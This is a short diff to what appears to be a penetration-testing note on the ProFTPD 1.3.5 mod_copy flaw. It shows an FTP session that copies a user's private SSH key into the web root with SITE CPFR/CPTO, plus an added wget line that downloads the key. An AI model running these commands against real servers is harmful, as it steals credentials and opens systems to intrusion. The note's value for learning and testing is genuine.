@@ -12,9 +12,13 @@ Real Example:
     220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.12.255]
     site cpfr /home/joe/.ssh/id_rsa
     350 File or directory exists, ready for destination name
-    site cpto /var/tmp/id_rsa
+    site cpto /var/www/html/id_rsa
     250 Copy successful
     quit
     221 Goodbye.
+```
+
+```
+   wget http://example.com/id_rsa
 ```
     
